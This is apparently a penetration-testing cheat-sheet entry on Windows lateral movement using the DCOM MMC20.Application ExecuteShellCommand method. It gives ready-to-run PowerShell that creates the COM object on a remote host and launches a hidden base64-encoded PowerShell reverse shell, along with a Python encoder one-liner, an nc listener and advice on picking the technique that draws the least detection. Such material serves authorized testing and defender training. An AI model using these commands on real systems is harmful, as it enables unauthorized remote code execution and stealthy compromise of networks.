title: DCOM Lateral Movement — MMC20.Application ExecuteShellCommand
body:
DCOM (Distributed COM) lets COM objects be instantiated across the network over RPC/135. The Microsoft Management Console object — MMC20.Application — exposes an ExecuteShellCommand method under Document.ActiveView that runs arbitrary shell commands on the remote host, by default available to local admins. It's a quieter lateral-movement path than PsExec because it creates NO service.

WHY IT'S USEFUL:
  - No service creation (unlike PsExec) — far less noisy, no Event 7045
  - Native — uses built-in COM, no tool to drop
  - Runs from an elevated PowerShell on your foothold against any host where you're local admin
  - Discovered/popularized by Matt Nelson (enigma0x3); Cybereason catalogued the DCOM family

HOW IT WORKS:
  You instantiate MMC20.Application remotely by passing the target IP as the second arg to GetTypeFromProgID. That returns a remote COM object. Then you call its Document.ActiveView.ExecuteShellCommand with four params (Command, Directory, Parameters, WindowState) — you only care about Command and Parameters.

SESSION 0:
  Like WMI, processes spawn in Session 0 (service isolation). You won't see a GUI on the target; verify with tasklist or just catch your reverse shell.

REQUIREMENTS:
  - Elevated PowerShell on the foothold
  - Local admin on the target (DCOM SCM requires it)
  - TCP 135 reachable (+ the dynamic RPC range)

Like WMI's Win32_Process.Create, ExecuteShellCommand is fire-and-forget — pair it with an encoded reverse shell and catch the callback. Same payload you'd build for the WMI technique.
cmd:
# ══════════════════════════════════════════════════
# From an ELEVATED PowerShell on your Windows foothold (as a local admin on target)
# ══════════════════════════════════════════════════

# 1) Instantiate MMC20.Application on the remote host (target IP as 2nd arg)
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

# 2) Proof-of-concept — pop calc on the target
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
#   params: Command, Directory(null), Parameters, WindowState("7")

# Verify on target (calc runs in Session 0):
#   tasklist | findstr calc   ->   win32calc.exe ... Services 0

# ══════════════════════════════════════════════════
# FULL REVERSE SHELL
# ══════════════════════════════════════════════════
# Build the base64 (UTF-16LE) PowerShell reverse shell on Kali first (same encoder
# as the WMI technique), start your listener, then:

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_REVSHELL>","7")

# Encoder (Kali) — UTF-16LE then base64, strip BOM:
#   python3 -c "import base64;p=open('shell.ps1','rb').read();print('powershell -nop -w hidden -e '+base64.b64encode(p.decode().encode('utf16')[2:]).decode())"

# Listener (Kali):
#   nc -lnvp 443
# Callback arrives from the TARGET as the user whose creds your foothold session holds.

# ══════════════════════════════════════════════════
# WHY PICK DCOM OVER THE OTHERS
# ══════════════════════════════════════════════════
# PsExec   -> interactive + output, but creates a SERVICE (Event 7045, loud)
# WMI      -> no service, fire-and-forget, very common technique (well-signatured)
# DCOM/MMC -> no service, less commonly monitored, but needs elevated PS + admin on target
# WinRM    -> clean but needs 5985/5986 open and Remote Management Users membership
# Pick based on what ports are open and how much noise you can afford.
warn: ExecuteShellCommand is fire-and-forget — it returns nothing useful, so pair it with a reverse shell and have your listener up first. Requires an ELEVATED PowerShell on the foothold and local admin on the target; a non-elevated prompt will fail to instantiate the remote object.

choices.label: Need the reverse shell payload / listener
Want an interactive shell instead — PsExec
Got a shell — re-enumerate as the new context
